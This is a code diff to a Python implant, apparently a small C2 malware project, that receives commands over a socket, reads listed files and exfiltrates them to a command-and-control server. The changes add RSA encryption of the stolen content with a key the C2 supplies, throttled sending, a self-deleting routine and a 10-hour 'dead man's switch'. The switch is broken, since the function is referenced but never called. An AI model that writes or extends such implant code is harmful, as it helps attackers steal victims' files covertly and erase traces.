@@ -4,6 +4,8 @@ from sys import argv
 import requests
 import socket
 import sys
+import rsa
+import time
 
 print("Implant Running")
 
@@ -44,6 +46,18 @@ def send_exfil(data):
     except:
         print("Error")
 
+def self_destruct():
+    remove(argv[0])
+    sys.exit()
+
+def check_time(start_time):
+    if(start_time == 0):
+        start_time = round(time.time() * 1000)
+    cur_millis = round(time.time() * 1000)
+    #delete after 10 hr running
+    if(cur_millis - start_time > 36000000):
+        self_destruct
+
 
 
 # Create a TCP/IP socket for the victim implant
@@ -53,7 +67,11 @@ implant_server_address = ('localhost', 10000)
 implant_socket.bind(implant_server_address)
 implant_socket.listen(1)
 
+start_time = 0
 while(True):
+    #dead man's switch
+    check_time(start_time)
+    
     command = recieve_command().decode("utf-8")
     print("Recieved Command: ", command)
     comm = command.split(";")[0]
@@ -83,13 +101,25 @@ while(True):
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
+        #rsa key
+        n = int(command.split(";")[1])
+        e = int(command.split(";")[2])
+        pubkey = rsa.PublicKey(n,e)
+        print(pubkey)
+        
         for line in Lines:
             #exfil the file for each location in Lines
             cur_file = open(line.replace("\n", ""), 'r')
             cur_file_lines = cur_file.readlines()
-            send_exfil(str.encode("------" + line.replace("\n", "") + "------\n"))
+            #encrypt the content before sending it back
+            file_title = "------" + line.replace("\n", "") + "------\n"
+            enc = rsa.encrypt(file_title.encode('utf8'), pubkey)
+            send_exfil(enc)
             for c in cur_file_lines:
-                send_exfil(str.encode(c))
+                #encrypt the content before sending it back
+                enc = rsa.encrypt(c.encode('utf8'), pubkey)
+                send_exfil(enc)
+                time.sleep(1)
             cur_file.close()
             
         #attempt to close socket
@@ -102,6 +132,6 @@ while(True):
             print("error")
 
     if(comm == "1"):
-        remove(argv[0])
-        exit()
+        #self destruct
+        self_destruct()
         
